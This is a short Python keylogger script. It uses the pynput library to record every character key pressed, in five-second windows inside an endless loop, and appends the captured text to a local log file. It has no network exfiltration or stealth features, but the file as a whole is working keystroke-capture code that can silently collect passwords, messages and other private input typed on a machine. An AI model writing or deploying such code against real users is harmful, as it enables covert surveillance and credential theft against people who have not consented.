import os
from pynput import keyboard
from key_listener import KeyListener

# --------------------- CONSTANTS --------------------- #

LOGS_DIR = './logs/'
LOG_FILE = 'log.txt'  # Full path to the log file

# --------------------- FUNCTIONS --------------------- #

def write_to_log(message: str, log_name: str) -> bool:
    """
    Writes a message to a log file.

    Args:
        message: The message to be written to the log file.
        log_name: The name of the log file.

    Returns:
        True if the message was successfully written to the log file, False otherwise.
    """
    try:
        log_path = os.path.join(LOGS_DIR, log_name)

        if not os.path.exists(LOGS_DIR):
            os.makedirs(LOGS_DIR)
            print(f"Directory {LOGS_DIR} created successfully!")

        # Create the log file if it doesn't exist
        if not os.path.exists(log_path):
            with open(log_path, 'w'):
                pass

        with open(log_path, 'a') as f:
            f.write(message)
        
        return True
    except Exception as e:
        print(e)
        return False


def read_keys(timeout=2) -> str:
    """
    Read and return a string formed by the keys pressed by the user.

    Args:
        timeout (int): The maximum duration (in seconds) to listen for keys.

    Returns:
        str: The string formed by the keys pressed.
    """
    keys = []

    def on_press(key):
        """
        Adds the pressed key to the list of keys if it is a character key.

        Parameters:
            key (pynput.keyboard.Key): The pressed key.

        Returns:
            None
        """
        try:
            keys.append(key.char)
        except AttributeError:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join(timeout=timeout)

    return ''.join(keys)

# --------------------- MAIN --------------------- #

def main():
    while True:
        key_listener = KeyListener()
        typed_keys = key_listener.read_keys(timeout=5)
        write_to_log(typed_keys, LOG_FILE)

if __name__ == "__main__":
    main()